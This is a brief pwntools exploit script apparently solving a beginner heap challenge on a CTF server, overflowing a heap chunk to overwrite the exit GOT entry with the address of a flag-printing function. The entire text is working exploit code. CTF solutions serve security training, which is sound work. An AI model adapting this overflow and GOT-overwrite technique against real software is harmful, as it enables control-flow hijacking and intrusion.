from pwn import *

#p = process('./beginner_heap.bin')
p = remote('ctf.j0n9hyun.xyz', 3016)
e = ELF('./beginner_heap.bin')
pause()
context.log_level="debug"

flag_f = 0x400826

payload = 'a' * 8 * 2
#next_heap_prev_size
payload += 'a' * 8 * 3

payload += p64(e.got['exit'])

p.sendline(payload)

p.sendline(p64(flag_f))

p.interactive()
